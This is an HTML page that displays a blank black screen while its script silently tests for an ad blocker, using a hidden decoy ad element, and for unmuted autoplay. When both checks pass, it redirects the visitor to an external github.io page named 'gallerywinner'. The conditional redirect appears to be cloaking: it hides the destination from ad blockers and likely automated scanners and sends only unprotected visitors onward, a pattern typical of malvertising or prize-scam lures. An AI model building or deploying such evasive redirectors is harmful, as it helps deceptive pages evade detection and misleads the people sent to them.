<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
  <head>

    <meta http-equiv="content-type" content="text/html; charset=UTF-8">&lt;head&gt;

    &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport"
    content="width=device-width, initial-scale=1.0"&gt;
    &lt;title&gt;&lt;/title&gt; &lt;style&gt; body { margin: 0;
    background: #000000; } &lt;/style&gt;
    <title></title>
  </head>
  <body>
    <!-- Decoy ad element for adblocker detection -->
    <div id="ad-probe"
      style="position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;"
      class="ad-banner pub_300x250 pub_300x250m pub_728x90 text-ad
      textAd text_ad text_ads text-ads text-ad-links">
    </div>
    <script>
  (async () => {
    // --- 1. Ad blocker detection ---
    function isAdBlockerActive() {
      const probe = document.getElementById('ad-probe');
      if (!probe) return true;
      const style = window.getComputedStyle(probe);
      // Adblockers typically hide or collapse ad elements
      if (
        style.display === 'none' ||
        style.visibility === 'hidden' ||
        style.opacity === '0' ||
        probe.offsetHeight === 0 ||
        probe.offsetWidth === 0
      ) {
        return true;
      }
      return false;
    }

    // --- 2. Autoplay detection ---
    async function isAutoplayAllowed() {
      const video = document.createElement('video');
      video.muted = false; // unmuted autoplay is stricter; use true for muted-only check
      video.src = 'data:video/mp4;base64,AAAAIGZ0eXBtcDQyAAAAAG1wNDJtcDQxaXNvbWF2YzEAAATKbW9vdg=='; // minimal stub
      try {
        await video.play();
        video.pause();
        return true;
      } catch (e) {
        return false;
      }
    }

    const adBlockOff = !isAdBlockerActive();
    const autoplayOn = await isAutoplayAllowed();

    if (adBlockOff && autoplayOn) {
      window.location.replace('https://marik4pharaoh.github.io/m4psite/gallerywinner');
    }
    // Otherwise: stay on the blank page silently
  })();
</script>
  </body>
</html>
